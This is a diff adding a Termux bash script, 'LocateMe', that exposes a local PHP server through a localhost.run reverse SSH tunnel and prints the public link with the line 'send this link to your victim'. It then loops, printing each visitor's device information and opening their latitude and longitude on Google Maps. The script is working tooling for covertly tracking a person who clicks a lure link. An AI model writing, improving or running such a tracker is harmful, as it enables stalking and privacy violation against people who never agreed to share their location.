@@ -1,0 +1,46 @@
+#!/data/data/com.termux/files/usr/bin/bash
+# Project : LocateMe
+# Author : Alienkrishn ~Anon4You
+clear
+rm .cflog info.log > /dev/null 2>&1
+
+figlet "    LocateMe"
+echo -e "
+Live location tracker :: locateme v1.2
+made with love by Anon4You
+"
+Infos="$PREFIX/share/locateme/php/info.txt"
+Result="$PREFIX/share/locateme/php/result.txt"
+printf "\nStating php server....\r"
+php -S localhost:8080 -t $PREFIX/share/locateme > /dev/null 2>&1 &
+sleep 3
+printf "Starting localhost.run....\r"
+ssh -R 80:localhost:8080 nokey@localhost.run > .cflog 2> /dev/null &
+sleep 10
+echo "All server started getting link"
+sleep 2
+clear
+figlet -f slant LocateMe
+echo -e "\nsend this link to your victim\n"
+link=$(grep -o 'https://[-0-9a-z]*\.lhr.life' ".cflog")
+echo link : $link
+checkFound() {
+    printf "\nWATING FOR RESPOSNSES!!...press CTRL+C to stop!!\n"
+    while [ true ]; do
+        if [[ -e $Infos ]]; then
+            printf "\nVictim Clicked on the link ;)!!\n"
+            cat  $Infos | jq
+            cat $Infos >info.log
+            rm -rf $Infos >/dev/null 2>&1
+        fi
+        if [[ -e $Result ]]; then
+            latitude=$(cat $Result | jq -r .info[].lat)
+            longitude=$(cat $Result | jq -r .info[].lon)
+            xdg-open """https://maps.google.com/maps?q="${latitude}","${longitude}""""
+            rm -rf $Result >/dev/null 2>&1
+            printf "\n\n Location :: https://maps.google.com/maps?q=${latitude},${longitude}\n\n\n"
+        fi
+    done
+}
+checkFound
+
